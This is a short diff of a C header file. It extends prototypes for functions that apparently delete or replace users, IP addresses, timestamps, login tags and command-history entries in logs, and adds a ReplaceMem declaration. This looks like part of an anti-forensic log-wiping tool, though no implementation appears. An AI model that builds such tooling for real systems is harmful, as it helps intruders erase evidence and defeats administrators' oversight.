@@ -38,18 +38,24 @@
 #define READ_FILE_DELAY		(1000*10)		//download speed and cpu rate
 
 
+#define TYPE_INT 			2
+#define TYPE_OCTETSTRING 	4
+#define TPYE_UTF8STRING 	12
+
+
 typedef int (*GetStringHdr_cb)(char*, char*,unsigned long * );
 
 int DeleteUser(char * username);
 
 int DeleteAddr(char * ip);
 
-int deleteLog(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM_LIMIT][256],GetStringHdr_cb *func );
+int deleteLog(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM_LIMIT][256],GetStringHdr_cb *func ,
+char replace[SEARCH_ITEM_LIMIT][256],int type[SEARCH_ITEM_LIMIT]);
 
 int DeleteDateTime(char * strParam);
 
 int MakeLoginTag(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM_LIMIT][256],
-char str[SEARCH_ITEM_LIMIT][256],int *strSize);
+char str[SEARCH_ITEM_LIMIT][256],int *strSize,int type[SEARCH_ITEM_LIMIT]);
 
 char* PartialCompare(char * hdr,int hdrLen, char sep, char * tail,int tailLen, char * data,int dLen);
 
@@ -69,3 +75,5 @@ int ParseCommandHistoryHeader(char * data,char * begin,unsigned long * value);
 
 
 int ParseDummy(char * data,char * begin,unsigned long * value);
+
+int ReplaceMem(char * param);
